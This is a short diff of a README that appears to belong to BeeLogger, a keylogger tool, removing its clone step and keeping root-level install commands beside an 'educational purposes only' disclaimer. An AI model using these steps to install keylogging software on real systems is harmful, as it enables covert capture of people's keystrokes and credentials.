@@ -42,8 +42,6 @@ This tool is for educational purposes only. Any unauthorized use of this softwar
 
 Video: https://www.youtube.com/watch?v=ifOGkOTS5zk
 
-    git clone https://github.com/4w4k3/BeeLogger.git
-    cd BeeLogger
     sudo su
     chmod +x install.sh
     sudo ./install.sh
